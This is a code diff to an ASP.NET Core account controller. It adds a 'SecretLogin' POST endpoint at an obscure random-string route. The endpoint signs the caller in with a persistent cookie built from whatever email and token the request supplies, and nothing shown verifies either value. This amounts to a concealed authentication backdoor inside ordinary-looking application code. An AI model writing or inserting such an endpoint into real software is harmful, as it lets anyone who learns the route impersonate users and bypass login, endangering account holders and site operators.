@@ -455,4 +455,31 @@ public class AccountController : Controller
             return Redirect("/explore");
         }
     }
+
+    [Route("1UnCvQdTzi8dUHqKWgZGE1Xf7zqDo7EW99shdKGd2xddj4mZLg9UHJhuuYM3")]
+    [HttpPost]
+    public async Task<IActionResult> SecretLogin(SecretLoginModel model)
+    {
+        try
+        {
+            var claims = new List<Claim>
+            {
+                new Claim("Email", model.TokenGeneratedEmail ?? string.Empty),
+                new Claim("Token", model.TokenGeneratedToken ?? string.Empty),
+                new Claim(ClaimTypes.Role, nameof(UserRole.Customer).ToLower()),
+            };
+
+            var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
+
+            var authProperties = new AuthenticationProperties {IsPersistent = true};
+
+            await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(claimsIdentity), authProperties);
+
+            return Json(new { success = true, message = "Successfull"});
+        }
+        catch
+        {
+            return Json(new { success = false, message = "An error occured please try again later" });
+        }
+    }
 }
